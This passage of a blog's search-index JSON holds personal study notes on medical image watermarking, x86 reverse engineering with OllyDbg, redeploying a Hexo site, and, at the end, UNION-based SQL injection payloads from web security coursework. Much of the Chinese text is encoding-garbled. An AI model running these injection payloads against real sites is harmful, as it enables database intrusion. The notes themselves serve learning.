water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to maintain better image quality.","text":"There are a wide variety of popular wavelet algorithms, including Daubechies wavelets, Mexican Hat wavelets and Morlet wavelets HAAR In addition, the Haar wavelet transform is fast, memory efficient and exactly reversible without the edge effects that are present in other wavelet transforms. the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to maintain better image quality.","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°2","slug":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°2","date":"2020-01-23T05:37:04.000Z","updated":"2020-01-23T05:46:12.002Z","comments":true,"path":"2020/01/23/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°2/","link":"","permalink":"http://finsenty54.github.io/2020/01/23/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°2/","excerpt":"state-of-the-art æœ€å…ˆè¿›çš„Error Correcting Codes ECCdiscrete wavelet transform (DWT) ç¦»æ•£å°æ³¢å˜æ¢The ECC based watermarking methods attempt to find a trade-off between the number of bits to be embedded and the number of bit-errors that can be corrected. the technique embeds medical text watermarks into selected sub-band of discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.è¯¥æŠ€æœ¯ä½¿ç”¨æ‰©å±•é¢‘è°±æŠ€æœ¯å°†åŒ»å­¦æ–‡æœ¬æ°´å°åµŒå…¥ç¦»æ•£å°æ³¢å˜æ¢ï¼ˆDWTï¼‰è¦†ç›–åŒ»å­¦å›¾åƒç³»æ•°çš„é€‰å®šå­å¸¦ä¸­ã€‚ Any image com-prises of two sections called ROI and NROI","text":"state-of-the-art æœ€å…ˆè¿›çš„Error Correcting Codes ECCdiscrete wavelet transform (DWT) ç¦»æ•£å°æ³¢å˜æ¢The ECC based watermarking methods attempt to find a trade-off between the number of bits to be embedded and the number of bit-errors that can be corrected. the technique embeds medical text watermarks into selected sub-band of discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.è¯¥æŠ€æœ¯ä½¿ç”¨æ‰©å±•é¢‘è°±æŠ€æœ¯å°†åŒ»å­¦æ–‡æœ¬æ°´å°åµŒå…¥ç¦»æ•£å°æ³¢å˜æ¢ï¼ˆDWTï¼‰è¦†ç›–åŒ»å­¦å›¾åƒç³»æ•°çš„é€‰å®šå­å¸¦ä¸­ã€‚ Any image com-prises of two sections called ROI and NROI ROI is an area that has sensi-tive data, so it cannot be allowed to be modified because most of the information is present in this area [105]. NROI is an area of image that does not have an important data i.e. background of image. The spatial domain tech-niques such as LSB substitutions, correlation-based, spread-spectrum and Patchwork are straight forward and computationally simple. In the transform domain techniques, the data is embedded by modulating the coefficients of a transform discrete wavelet transform (DWT), discrete cosine transform (DCT), singular value decomposition (SVD) and discrete Fourier transform (DFT).finite energy function æœ‰é™èƒ½é‡å‡½æ•° åœ¨æ•°ä½ä¿¡å·å¤„ç†é¢†åŸŸä¸­ï¼Œé™é‡‡æ ·ï¼Œåˆä½œå‡é‡‡é›†,æ˜¯ä¸€ç§å¤šé€Ÿç‡æ•°å­—ä¿¡å·å¤„ç†çš„æŠ€æœ¯æˆ–æ˜¯é™ä½ä¿¡å·é‡‡æ ·ç‡çš„è¿‡ç¨‹ï¼Œé€šå¸¸ç”¨äºé™ä½æ•°æ®ä¼ è¾“é€Ÿç‡æˆ–è€…æ•°æ®å¤§å°ã€‚é™é‡‡æ ·å› å­ï¼ˆå¸¸ç”¨è¡¨ç¤ºç¬¦å·ä¸ºï¼‚Mï¼‚ï¼‰ä¸€èˆ¬æ˜¯å¤§äºï¼‘çš„æ•´æ•°æˆ–æœ‰ç†æ•°ã€‚è¿™ä¸ªå› å­è¡¨è¾¾é‡‡æ ·å‘¨æœŸå˜æˆåŸæ¥çš„Må€ï¼Œæˆ–è€…ç­‰ä»·è¡¨ç¤ºé‡‡æ ·ç‡å˜æˆåŸæ¥çš„1/Må€ã€‚ é‡‡æ ·ç‡çš„é™ä½ä¼šé€ æˆé¢‘è°±çš„å‹ç¼©ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨æ»¤æ³¢å™¨ç¡®ä¿åœ¨è¾ƒä½çš„é‡‡æ ·é¢‘ç‡ä¸‹ä¸å‘ç”Ÿæ··å ï¼Œç¡®ä¿å¥ˆå¥å¼é‡‡æ ·å®šç†ä¾æ—§æˆç«‹ã€‚ å½¢å¼å¹‚çº§æ•°ä¸Šçš„ä¸€ä¸ªé‡è¦æ˜ å°„æ˜¯ç³»æ•°çš„æå–æ“ä½œï¼šå°†ä¸€ä¸ªå½¢å¼å¹‚çº§æ•°æ˜ å°„åˆ°å®ƒçš„X^nçš„ç³»æ•°ã€‚è¿™ä¸ªæ“ä½œå¸¸å¸¸è®°ä½œ[X^n]ï¼Œ ä»¥ä¸€å˜æ•°ä¸ºt çš„å‡½æ•° f(t) ä¸ºä¾‹ï¼Œf(t) ç»è¿‡ä¸€ç§¯åˆ†è½¬æ¢T å¾—åˆ°Tf(u)ï¼šå…¶ä¸­ K æ˜¯ä¸ªç¡®å®šçš„äºŒå…ƒå‡½æ•°, ç§°ä¸ºæ­¤ç§¯åˆ†å˜æ¢çš„æ ¸å‡½æ•°ï¼ˆkernel functionï¼‰æˆ–æ ¸ï¼ˆnucleusï¼‰ã€‚å½“é€‰å–ä¸åŒçš„ç§¯åˆ†åŸŸå’Œå˜æ¢æ ¸æ—¶ï¼Œå°±å¾—åˆ°ä¸åŒåç§°çš„ç§¯åˆ†å˜æ¢ã€‚f(t) ç§°ä¸ºè±¡åŸå‡½æ•°ï¼ŒTf(u) ç§°ä¸º f(t) çš„è±¡å‡½æ•°ï¼Œåœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼Œå®ƒä»¬æ˜¯ä¸€ä¸€å¯¹åº”è€Œå˜æ¢æ˜¯å¯é€†çš„ã€‚ å®šä¹‰åœ¨å®æ•°åŸŸä¸Šçš„å®å‡½æ•°ç›¸å¯¹äºå€¼cçš„né˜¶çŸ©ä¸º: å¦‚æœf(x)æ˜¯æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼Œåˆ™å®¹æ˜“çœ‹å‡ºç›¸å¯¹äºå€¼0çš„1é˜¶çŸ©æ˜¯è¿ç»­éšæœºå˜é‡çš„æ•°å­¦æœŸæœ›ã€‚ vanishing moment æ¯å°æ³¢å®šä¹‰ä¸ºå…¶ä¸­aæ˜¯ç¼©æ”¾å› å­ï¼Œå½“|a|&lt;1æ—¶ï¼Œæ¯å°æ³¢è¢«å‹ç¼©ï¼Œåœ¨æ—¶é—´è½´ä¸Šæœ‰è¾ƒå°çš„æ”¯æ’‘åº¦ï¼Œå¹¶ä¸”å¯¹åº”åˆ°é«˜é¢‘ï¼Œå› ä¸ºæ¯å°æ³¢å˜çª„ã€å˜åŒ–å˜å¿«ï¼Œ åä¹‹ï¼Œå½“|a|&gt;1æ—¶ï¼Œæ¯å°æ³¢å˜å®½ã€å˜åŒ–è¾ƒæ…¢ï¼Œæ‰€ä»¥å¯¹åº”åˆ°ä½é¢‘ã€‚båˆ™æ˜¯å¹³ç§»å‚æ•°ï¼Œç”¨æ¥å†³å®šæ¯å°æ³¢çš„ä½ç½®ã€‚å°æ³¢åˆ†æï¼ˆè‹±è¯­ï¼šwavelet analysisï¼‰æˆ–å°æ³¢å˜æ¢ï¼ˆè‹±è¯­ï¼šwavelet transformï¼‰æ˜¯æŒ‡ç”¨æœ‰é™é•¿æˆ–å¿«é€Ÿè¡°å‡çš„â€œæ¯å°æ³¢â€ï¼ˆmother waveletï¼‰çš„æŒ¯è¡æ³¢å½¢æ¥è¡¨ç¤ºä¿¡å·ã€‚è¯¥æ³¢å½¢è¢«ç¼©æ”¾å’Œå¹³ç§»ä»¥åŒ¹é…è¾“å…¥çš„ä¿¡å·ã€‚åœ¨ä¿¡å·å¤„ç†ä¸­ï¼Œçª—å‡½æ•°ï¼ˆè‹±è¯­ï¼šwindow functionï¼‰æ˜¯ä¸€ç§é™¤åœ¨ç»™å®šåŒºé—´ä¹‹å¤–å–å€¼å‡ä¸º0çš„å®å‡½æ•°ã€‚è­¬å¦‚ï¼šåœ¨ç»™å®šåŒºé—´å†…ä¸ºå¸¸æ•°è€Œåœ¨åŒºé—´å¤–ä¸º0çš„çª—å‡½æ•°è¢«å½¢è±¡åœ°ç§°ä¸ºçŸ©å½¢çª—ã€‚ä»»ä½•å‡½æ•°ä¸çª—å‡½æ•°ä¹‹ç§¯ä»ä¸ºçª—å‡½æ•°ï¼Œæ‰€ä»¥ç›¸ä¹˜çš„ç»“æœå°±åƒé€è¿‡çª—å£â€œçœ‹â€å…¶ä»–å‡½æ•°ä¸€æ · å˜æ¢(Transform)ã€é‡åŒ–(Quantization)å’Œç¼–ç (Coding)[å¦å¤–ï¼Œå½“è¾“å…¥ä¿¡å·ä¸ºäºŒç»´æ—¶ï¼ˆä¾‹å¦‚ï¼šå½±åƒï¼‰ï¼ŒçŸ­æ—¶è·å‚…é‡Œå¶å˜æ¢çš„è¾“å‡ºä¸ºå››ç»´åº¦ï¼Œä½†å°æ³¢å˜æ¢ä»æ˜¯äºŒç»´ä¿¡å·ï¼Œæ‰€ä»¥åœ¨å½±åƒå¤„ç†ä¸Šé€šå¸¸ä¼šä½¿ç”¨å°æ³¢å˜æ¢è€ŒéçŸ­æ—¶è·å‚…é‡Œå¶å˜æ¢ã€‚ Î£Î£ è¿™æ˜¯äºŒé‡æ±‚å’Œç¬¦å·12345i=m j=n..Î£... Î£ . . . . ai bj = a1b1+a1b2+ . . . +a1bn+i=1 j=1 . . . . . . .+a2b1+a2b2+ . . . +a2bn+. . . . . .. . . . . . . . . . +. . . . +. . . . . . . . . . . . . . . .+amb1+amb2+ . . . . +ambn.","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°1","slug":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°1","date":"2020-01-21T11:30:44.000Z","updated":"2020-01-21T11:33:29.920Z","comments":true,"path":"2020/01/21/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°1/","link":"","permalink":"http://finsenty54.github.io/2020/01/21/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°1/","excerpt":"the water-mark robustness is the key performance parameter. a watermark can be embedded in every frame. watermarking that pro-tects the content even after decryption","text":"the water-mark robustness is the key performance parameter. a watermark can be embedded in every frame. watermarking that pro-tects the content even after decryption due to higher data embedding capacity of image, visible watermark is a secondary translu-cent overlaid into the primary image. Dual watermark is a combination of a visible and an invisible watermark the watermarking system consists of two processes - encoding and extraction process lossy compression æœ‰æŸå‹ç¼©steganography éšå†™æœ¯obustness å¥å£®æ€§exponentially æŒ‡æ•°åœ°archiving å­˜æ¡£geometrical å‡ ä½•Classification åˆ†ç±»Spatial ç©ºé—´çš„cryptography å¯†ç å­¦pixel åƒç´ ç‚¹ [ËˆpÉªksl]designated ç‰¹å®šçš„confidentiality ä¿å¯†on account of ç”±äºTamper ç¯¡æ”¹confidentiality æœºå¯†æ€§","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°4","slug":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°4","date":"2019-11-29T08:05:04.000Z","updated":"2019-11-29T08:12:54.684Z","comments":true,"path":"2019/11/29/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°4/","link":"","permalink":"http://finsenty54.github.io/2019/11/29/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°4/","excerpt":"åœ¨PEæ–‡ä»¶ä¸­æ‰¾åˆ°ä»€ä¹ˆï¼Œåœ¨å†…å­˜åŒæ ·å¯ä»¥æ‰¾åˆ° PEæ–‡ä»¶ç»„æˆDOS header DOS stub PE file header Image Optional Header Section table Data Directories Sections","text":"åœ¨PEæ–‡ä»¶ä¸­æ‰¾åˆ°ä»€ä¹ˆï¼Œåœ¨å†…å­˜åŒæ ·å¯ä»¥æ‰¾åˆ° PEæ–‡ä»¶ç»„æˆDOS header DOS stub PE file header Image Optional Header Section table Data Directories Sections PE header é€šå¸¸ä½äº[imagebase]~[imagebase+1000]memory double click æ”¹å˜PE entry point ä»¥è·³è¿‡ä¸€äº›ä»£ç binary fill with nopsPE headeré€šå¸¸å¤§å°æ˜¯1000h EAT åº“ç”¨æ¥æ–¹ä¾¿å…¶ä»–ç¨‹åºä½¿ç”¨å‡½æ•° trickå¼¹å‡ºæ¶ˆæ¯æ¡†çš„åœ°æ–¹ï¼Œpasedï¼Œ alt+f9 , å†ç‚¹æ¶ˆæ¯æ¡†ï¼ˆ80%çš„æƒ…å†µä¸‹æœ‰ç”¨ï¼‰åœ¨memoryçª—å£ä¸‹æœç´¢ï¼Œå†…å­˜ä¸­çš„æ•°æ®find reference","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°3","slug":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°3","date":"2019-11-21T12:44:21.000Z","updated":"2019-11-21T12:48:27.861Z","comments":true,"path":"2019/11/21/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°3/","link":"","permalink":"http://finsenty54.github.io/2019/11/21/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°3/","excerpt":"windowsç¨‹åºè¿è¡Œåœ¨Ring 3çº§ï¼Œä½†è¦è¿è¡Œåœ¨å†…æ ¸çº§ï¼ˆRing 0ï¼‰ï¼Œä½¿ç”¨APIè¯·æ±‚ï¼ŒAPIå­˜å‚¨åœ¨dllä¸­ FFFFFFFF==-1 åŒå‡»å¯æ”¹å˜FLAG å¯„å­˜å™¨å€¼","text":"windowsç¨‹åºè¿è¡Œåœ¨Ring 3çº§ï¼Œä½†è¦è¿è¡Œåœ¨å†…æ ¸çº§ï¼ˆRing 0ï¼‰ï¼Œä½¿ç”¨APIè¯·æ±‚ï¼ŒAPIå­˜å‚¨åœ¨dllä¸­ FFFFFFFF==-1 åŒå‡»å¯æ”¹å˜FLAG å¯„å­˜å™¨å€¼ åŒå‡»EIPå›å» in ollydbg info ä»ä¸€ä¸ªAPIä¸­è¿”å›æ€»åœ¨EAXä¸­ PEæ–‡ä»¶ã€‚å†…å­˜èŠ‚åŒºå¤´è¦åœ¨å„è‡ªæœ€å°åŸºæœ¬å•ä½çš„å€æ•°ä¸Šï¼Œæ‰€ä»¥ä½¿ç”¨NULLå¡«å…… RVA+imageBase==VA(ç»å¯¹åœ°å€ï¼‰ PEå¤´å†…éƒ¨ä½¿ç”¨RVA 4D5A =,,,MZ ï¼ˆPEæ–‡ä»¶å¼€å¤´ï¼ŒIMAGE_DOS_HEADER) INTEL å°ç«¯åºï¼šï¼še_lfanew==000000E0 32ä½EXE ImageBase == 00400000","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"bug","slug":"bug","date":"2019-11-20T12:25:45.000Z","updated":"2019-11-20T12:29:19.438Z","comments":true,"path":"2019/11/20/bug/","link":"","permalink":"http://finsenty54.github.io/2019/11/20/bug/","excerpt":"ä¿®å¤äº†å‘å¸ƒæ—¶é—´è¶…å‰çš„é—®é¢˜â€“åœ¨é…ç½®æ–‡ä»¶ä¸­å°†æ—¶åŒºä¿®æ”¹ä¸ºAsia/Shanghai2019-11-20 20:28:32 æ˜ŸæœŸä¸‰","text":"ä¿®å¤äº†å‘å¸ƒæ—¶é—´è¶…å‰çš„é—®é¢˜â€“åœ¨é…ç½®æ–‡ä»¶ä¸­å°†æ—¶åŒºä¿®æ”¹ä¸ºAsia/Shanghai2019-11-20 20:28:32 æ˜ŸæœŸä¸‰","categories":[],"tags":[{"name":"bug","slug":"bug","permalink":"http://finsenty54.github.io/tags/bug/"}]},{"title":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°2","slug":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°2","date":"2019-11-20T12:02:41.000Z","updated":"2019-11-20T13:05:34.766Z","comments":true,"path":"2019/11/20/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°2/","link":"","permalink":"http://finsenty54.github.io/2019/11/20/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°2/","excerpt":"æ ˆå°±æ˜¯ä¸€å°æ®µå†…å­˜ç©ºé—´ï¼Œå¤§å°è®°å½•åœ¨PEå¤´ä¸­ RETN 8 =RETN POP 8 stdcallæ¸…ç†æ–¹å¼ è¢«è°ƒç”¨è€…æ¸…ç†ï¼Œcdeclè°ƒç”¨è€…æ¸…ç† Nags å” å¨ VB ThunRTMain å‡½æ•° è°ƒç”¨æ¶ˆæ¯æ¡† rtcMsgBox","text":"æ ˆå°±æ˜¯ä¸€å°æ®µå†…å­˜ç©ºé—´ï¼Œå¤§å°è®°å½•åœ¨PEå¤´ä¸­ RETN 8 =RETN POP 8 stdcallæ¸…ç†æ–¹å¼ è¢«è°ƒç”¨è€…æ¸…ç†ï¼Œcdeclè°ƒç”¨è€…æ¸…ç† Nags å” å¨ VB ThunRTMain å‡½æ•° è°ƒç”¨æ¶ˆæ¯æ¡† rtcMsgBox Set Breakpoint on every call to rtcMsgBox 1 opcode == 1 byte 4 bytes == 1 dword registers is 32 bit Lenaè§†é¢‘å­¦ä¹ è¿™æ˜¯ä¹¦æœ¬ä»‹ç»çš„ï¼Œè¿™æ˜¯tuts4youcrackmeä¸‹è½½åœ°å€ï¼Œé‡Œé¢è¿˜æœ‰è§†é¢‘æ•™ç¨‹å’Œä¸€äº›å…¶ä»–æ•™ç¨‹ã€‚ Assembler : The Basics In ReversingSS stack segmentC-Flag &gt;FFFFFFFF and &lt;0 æ—¶è®¾ç½®segmens(a page in a book) + offsets(a specific line on that page) add eax,ebx ;; Register, Register add eax,123 ;; Register, Value add eax,dword ptr [404000] ;; Register, Dword Pointer [value] add eax,dword ptr [eax] ;; Register, Dword Pointer [register] add eax,dword ptr [eax+00404000] ;; Register, Dword Pointer [register+value] add dword ptr [404000],eax ;; Dword Pointer [value], Register add dword ptr [404000],123 ;; Dword Pointer [value], Value add dword ptr [eax],eax ;; Dword Pointer [register], Register add dword ptr [eax],123 ;; Dword Pointer [register], Value add dword ptr [eax+404000],eax ;; Dword Pointer [register+value], Register add dword ptr [eax+404000],123 ;; Dword Pointer [register+value], value INT3 and INTO are interrupt calls that take no parameters but call the handlers for interrupts 3 and 4, respectively. JA* - Jump if (unsigned) above - CF=0 and ZF=0 JAE - Jump if (unsigned) above or equal - CF=0 JB* - Jump if (unsigned) below - CF=1 JBE - Jump if (unsigned) below or equal - CF=1 or ZF=1 JC - Jump if carry flag set - CF=1 JCXZ - Jump if CX is 0 - CX=0 JE** - Jump if equal - ZF=1 JECXZ - Jump if ECX is 0 - ECX=0 JG* - Jump if (signed) greater - ZF=0 and SF=OF (SF = Sign Flag) JGE* - Jump if (signed) greater or equal - SF=OF JL* - Jump if (signed) less - SF != OF (!= is not) JLE* - Jump if (signed) less or equal - ZF=1 and OF != OF JMP** - Jump - Jumps always JNA - Jump if (unsigned) not above - CF=1 or ZF=1 JNAE - Jump if (unsigned) not above or equal - CF=1 JNB - Jump if (unsigned) not below - CF=0 JNBE - Jump if (unsigned) not below or equal - CF=0 and ZF=0 JNC - Jump if carry flag not set - CF=0 JNE** - Jump if not equal - ZF=0 JNG - Jump if (signed) not greater - ZF=1 or SF!=OF JNGE - Jump if (signed) not greater or equal - SF!=OF JNL - Jump if (signed) not less - SF=OF JNLE - Jump if (signed) not less or equal - ZF=0 and SF=OF JNO - Jump if overflow flag not set - OF=0 JNP - Jump if parity flag not set - PF=0 JNS - Jump if sign flag not set - SF=0 JNZ - Jump if not zero - ZF=0 JO - Jump if overflow flag is set - OF=1 JP - Jump if parity flag set - PF=1 JPE - Jump if parity is equal - PF=1 JPO - Jump if parity is odd - PF=0 JS - Jump if sign flag is set - SF=1 JZ - Jump if zero - ZF=1 LEA (Load Effective Address)Syntax: LEA dest,srcLEA can be treated the same way as the MOV instruction. It isnâ€™t used too much for its original function, but more for quick multiplications like this: lea eax, dword ptr [4*ecx+ebx] which gives eax the value of 4*ecx+ebxptr== pointer POPSyntax: POP destPOP loads the value of byte/word/dword ptr [esp] jianæ¥å¯»å€ espæŒ‡å‘çš„å€¼zuo wei dizhiand puts it into dest. TESTSyntax: TEST operand1, operand2This instruction is in 99% of all cases used for â€œTEST EAX, EAXâ€. It performs a LogicalAND(AND instruction)but does not save the values. It only sets the Z-Flag, when EAX is 0 or clears it, when EAX is not 0. The O/C flags are always cleared. XORSyntax: XOR dest,srcThe XOR instruction connects two values using logical exclusive OR (remember OR uses inclusive OR).This instruction clears the O-Flag and the C-Flag and can set the Z-Flag.To understand XOR better, consider those two binary values: 1001010110 0101001101 If you XOR them, the result is 1100011011 The most often seen use of XOR is â€œXOR, EAX, EAXâ€.This will set EAX to 0, because when you XOR a value with itself, the result is always 0. I hope you understand why, elsewrite down a value on paper and try ;)","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°1","slug":"ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°1","date":"2019-11-19T15:06:56.000Z","updated":"2019-11-19T15:18:42.530Z","comments":true,"path":"2019/11/19/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°1/","link":"","permalink":"http://finsenty54.github.io/2019/11/19/ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°1/","excerpt":"ä¹°è¿™æœ¬ä¹¦æœ‰ä¸€å¹´äº†ï¼Œä½†åªçœ‹äº†ä¸€ç‚¹ç‚¹ï¼Œå¸Œæœ›èƒ½å­¦å®Œ ä¿å­˜æ›´æ”¹åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ1ä¿å­˜åˆ°COPY TO EXECUTABLE FILEï¼Œ2é€‰æ‹©SAVE FILE åº”ç”¨ç¨‹åºè¢«åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œæœ‰ä¸€æœ€å°åˆ†é…ç©ºé—´ space = assembleï¼Œç”¨äºæ›´æ”¹ä»£ç ","text":"ä¹°è¿™æœ¬ä¹¦æœ‰ä¸€å¹´äº†ï¼Œä½†åªçœ‹äº†ä¸€ç‚¹ç‚¹ï¼Œå¸Œæœ›èƒ½å­¦å®Œ ä¿å­˜æ›´æ”¹åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ1ä¿å­˜åˆ°COPY TO EXECUTABLE FILEï¼Œ2é€‰æ‹©SAVE FILE åº”ç”¨ç¨‹åºè¢«åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œæœ‰ä¸€æœ€å°åˆ†é…ç©ºé—´ space = assembleï¼Œç”¨äºæ›´æ”¹ä»£ç  å¤§ç«¯åº 12 34 å°ç«¯åº 34 12 ä¸€ä¸ªå­—èŠ‚é‡Œé¡ºåºä¸€æ · é€†åºå‹æ ˆï¼Œæ ˆFILO æ ˆçª—å£ï¼Œaddress-relative to EBP EBP ESP å­˜å‚¨çš„æ˜¯æ ˆåœ°å€-ã€‹ä»£è¡¨æ•°æ® 1.CALL å‹å…¥ä¸‹ä¸€åœ°å€ -1 2.PUSH å‹å…¥ä¸Šä¸€æ ˆå¸§åŸºåœ°å€ -1 3.MOV EBP ESP 4. MOV ESP EBP 5.POP EBP å–å‡ºåŸºåœ°å€ +1 6.RETN å–å‡ºä¸‹ä¸€åœ°å€+1 local å±€éƒ¨å˜é‡ ARG å‚æ•° test = and =0 åˆ™ ZF=1 JE ZF=1 è·³è½¬ å±€éƒ¨å¯¹è±¡å­˜å‚¨åœ¨æ ˆåŒº é€‰ä¸­åœ°å€ï¼ŒFollow in dump dumpä¸­ï¼Œlong-address with ASCII dump VBä½¿ç”¨unicode API getâ€¦Text è°ƒè¯•å‰é¢„æµ‹ä»£ç çš„å®ç° å…ˆä¸Šæ‰˜ï¼Œæ‰¾åˆ°æ ˆå¸§ç”Ÿæˆéƒ¨åˆ†","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"åœ¨æ–°ç”µè„‘ä¸Šé‡æ–°éƒ¨ç½²hexo","slug":"åœ¨æ–°ç”µè„‘ä¸Šé‡æ–°éƒ¨ç½²hexo","date":"2019-11-19T03:31:43.000Z","updated":"2019-11-19T06:19:51.580Z","comments":true,"path":"2019/11/19/åœ¨æ–°ç”µè„‘ä¸Šé‡æ–°éƒ¨ç½²hexo/","link":"","permalink":"http://finsenty54.github.io/2019/11/19/åœ¨æ–°ç”µè„‘ä¸Šé‡æ–°éƒ¨ç½²hexo/","excerpt":"è¿‘æœŸæœ‰äº†ä¸€å°æ–°ç”µè„‘ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°éƒ¨ç½²ä¸€ä¸‹hexoï¼Œæˆ‘çœ‹äº†å‡ ä¸ªæ•™ç¨‹ï¼Œå…¶å®å¾ˆç®€å•çš„ï¼Œå´å¼„å¤æ‚äº† 1. å‰æœŸå‡†å¤‡hexoå®‰è£…éµå¾ªè¯¥é¡µé¢è¿›è¡Œgitå’Œnodejsçš„å®‰è£…å°†ä¹‹å‰çš„hexoæ–‡ä»¶æ•´ä¸ªæ‹·è´è¿‡æ¥","text":"è¿‘æœŸæœ‰äº†ä¸€å°æ–°ç”µè„‘ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°éƒ¨ç½²ä¸€ä¸‹hexoï¼Œæˆ‘çœ‹äº†å‡ ä¸ªæ•™ç¨‹ï¼Œå…¶å®å¾ˆç®€å•çš„ï¼Œå´å¼„å¤æ‚äº† 1. å‰æœŸå‡†å¤‡hexoå®‰è£…éµå¾ªè¯¥é¡µé¢è¿›è¡Œgitå’Œnodejsçš„å®‰è£…å°†ä¹‹å‰çš„hexoæ–‡ä»¶æ•´ä¸ªæ‹·è´è¿‡æ¥ 2. é…ç½®SSHç”Ÿæˆrsaå…¬ç§é’¥ $ cd ~/.ssh # Checks to see if there is a directory named &quot;.ssh&quot; in your user directory $ ssh-keygen -t rsa -C &quot;your_email@example.com&quot; # Creates a new ssh key using the provided email Generating public/private rsa key pair. Enter file in which to save the key (/home/you/.ssh/id_rsa): ç„¶ååœ¨GitHubé‡Œæ·»åŠ å…¬é’¥ï¼Œåœ¨é¡¹ç›®çš„settingé‡Œæœ‰ä¸€deploy keyï¼Œåœ¨è¿™é‡Œæ·»åŠ å…¬é’¥ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤éªŒè¯ ssh -T git@github.com å¦‚æœä¸è¡Œï¼Œå°±æ˜¯æ²¡æœ‰åœ¨.sshæ–‡ä»¶å¤¹é‡Œåˆ›å»ºï¼Œéœ€è¦æ¥ä¸‹æ¥çš„ä¸¤æ­¥ ssh-agent -s ssh-add ~/.ssh/id_rsa è‹¥æç¤ºè¦è¾“å…¥å¯†ç ä»€ä¹ˆçš„ï¼Œåˆ™åœ¨_config.ymlé…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹repo deploy: type: git repo: git@github.com:chengjianhua/chengjianhua.github.io.git branch: master è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸ç”¨npm installæˆ–initial","categories":[],"tags":[{"name":"else","slug":"else","permalink":"http://finsenty54.github.io/tags/else/"}]},{"title":"burpsuite å®‰å…¨å­¦é™¢ç¬”è®°","slug":"sql-more-details","date":"2019-05-17T02:33:13.000Z","updated":"2019-11-19T06:17:16.100Z","comments":true,"path":"2019/05/17/sql-more-details/","link":"","permalink":"http://finsenty54.github.io/2019/05/17/sql-more-details/","excerpt":"For a UNION query to work, two key requirements must be met: The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. â€˜ ORDER BY 1â€“â€˜ ORDER BY 2â€“â€˜ ORDER BY 3â€“ â€˜ UNION SELECT NULLâ€“â€˜ UNION SELECT NULL,NULLâ€“â€˜ UNION SELECT NULL,NULL,NULLâ€“","text":"For a UNION query to work, two key requirements must be met: The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. â€˜ ORDER BY 1â€“â€˜ ORDER BY 2â€“â€˜ ORDER BY 3â€“ â€˜ UNION SELECT NULLâ€“â€˜ UNION SELECT NULL,NULLâ€“â€˜ UNION SELECT NULL,NULL,NULLâ€“The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries 